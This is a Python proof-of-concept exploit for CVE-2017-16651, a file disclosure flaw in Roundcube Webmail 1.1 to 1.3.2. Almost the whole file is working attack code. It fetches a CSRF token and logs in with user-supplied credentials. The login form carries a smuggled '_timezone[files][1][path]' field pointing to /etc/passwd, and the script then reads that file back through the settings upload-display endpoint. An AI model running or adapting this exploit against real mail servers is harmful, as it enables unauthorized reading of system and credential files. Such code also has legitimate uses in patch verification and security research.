#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time

"""
    Roundcube Webmail File Disclosure Vulnerability
    ------------
    CVE : CVE-2017-16651
    Affected Versions: 1.1.0 - 1.1.9, 1.2.0 - 1.2.6, 1.3.0 - 1.3.2

    Requirements
    ------------
    - email account : username / password

    References :
        https://github.com/roundcube/roundcubemail/issues/6026
        https://nvd.nist.gov/vuln/detail/CVE-2017-16651

    See more:(better check with burpsuite and firefox)
        http://www.cnblogs.com/Hi-blog/p/8760413.html
"""

description = "Roundcube Webmail File Disclosure Vulnerability(CVE-2017-16651)"

url = 'http://mail.roundcube.com/roundcubemail/'


class roundcube():
    """
    roundcube rce exploit class
    """
    def init(self, url):
        """
        init some basic args
        """
        # self.base_url = 'http://mail.roundcube.com/roundcubemail/'
        self.base_url = '{}'.format(url)
        print('base_url : {}'.format(self.base_url))

        # self.url_login = 'http://mail.roundcube.com/roundcubemail/?_task=login'
        self.url_login = '{}/?_task=login'.format(self.base_url)
        print('url_login : {}'.format(self.url_login))

        self.s = requests.Session()
        self.csrf_token = ''

        # 加headers 伪造请求头。
        self.s.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:59.0) Gecko/20100101 Firefox/59.0',
        }

    def get_csrf_token(self, content):
        """
        登陆时需要先获取CSRF-Token
        :return: csrf-token
        """
        index = content.find('request_token')
        self.csrf_token = content[index+16:index+16+32]
        print('csrf_token : {}\n'.format(self.csrf_token))
        return self.csrf_token

    def login(self):
        """
        Login to Roundcube Webmail
        :return: None
        """
        _user = input('please input username : ')
        _pass = input('please input password : ')

        # self.path = input('please input webmail path(eg./var/www/html/roundcubemail) : ')

        form_data = {
            '_token': self.csrf_token,
            '_task': 'login',
            '_action': 'login',
            '_timezone[files][1][path]': '/etc/passwd',
            '_url': '_task=login',
            '_user': _user,
            '_pass': _pass
        }
        # print(form_data)
        request = self.s.post(self.url_login, data=form_data)
        content = request.text
        self.get_csrf_token(content)
        # print(content)

    def fetch_file(self, url):
        print('step 3 : fetch {}'.format(url))
        url = '{}{}'.format(url, '/?_task=settings&_action=upload-display&_from=timezone&_file=rcmfile1')
        print('url : {}'.format(url))
        req = self.s.get(url, timeout=3)
        if req.status_code == 200:

            content = req.text
            print(content)
            # content will be like this
            # root:x:0:0:root:/root:/bin/bash

            # check whether we can access file
            if 'root' in content:
                return True

    def auto_exploit(self, url):
        """
        Auto exploit Roundcube Webmail base on self class functions
        :param url: the remote system to test
        :return: True
        """

        # initialize
        self.init(url)

        # step1 : get csrf_token for login
        print('step 1 : {}'.format(self.base_url))
        content = self.s.get(self.base_url).text
        self.get_csrf_token(content)

        print('step 2 : {}'.format(self.url_login))
        self.login()

        # try to fetch file
        return self.fetch_file(url)


def poc(url):

    url = 'http://{}'.format(url)

    try:
        return roundcube().auto_exploit(url)
    except:
        return False

